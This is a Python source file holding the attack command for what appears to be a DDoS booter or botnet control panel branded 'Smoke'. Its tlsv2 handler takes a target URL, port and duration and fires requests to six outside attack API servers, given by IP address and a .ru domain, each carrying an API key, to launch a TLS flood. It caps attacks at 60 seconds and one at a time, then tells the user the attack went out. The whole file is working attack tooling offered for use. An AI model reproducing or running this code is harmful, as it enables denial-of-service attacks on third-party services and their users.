import requests
from colorama import Fore
import time

last_tlsv2_time = 0

def tlsv2(args, validate_time, send, client, ansi_clear, broadcast, data):
    global last_tlsv2_time
    if len(args) == 4:
        url = args[1]
        port = args[2]
        time_str = args[3]
        try:
            time_int = int(time_str)
            if time_int > 60:
                send(client, "Your max time is 60 seconds")
                return
            if time.time() - last_tlsv2_time < 60:
                send(client, "Your max concurrent is 1")
                return

            res1 = requests.get(f'http://162.19.145.38/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLSV2')
            res2 = requests.get(f'https://bullingov.ru/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLSV2')
            res3 = requests.get(f'http://185.9.147.161/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLSV2')
            res4 = requests.get(f'http://188.127.225.58/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLSV2')
            res5 = requests.get(f'http://188.127.225.119/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLSV2')
            res6 = requests.get(f'http://188.127.224.36/api.php?key=sqpenis&host={url}&port={port}&time={time_str}&method=TLSV2')
            if validate_time(str(time_int)):
                last_tlsv2_time = time.time()
                send(client, f"{Fore.LIGHTWHITE_EX}Attack successfully sent to all {Fore.LIGHTRED_EX}Smoke {Fore.LIGHTWHITE_EX}servers!")
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-1200 seconds)')
        except Exception as e:
            send(client, f'Error: {str(e)}')
    else:
        send(client, f'Usage: {Fore.LIGHTWHITE_EX}!tlsv2 [URL] [PORT] [TIME]')
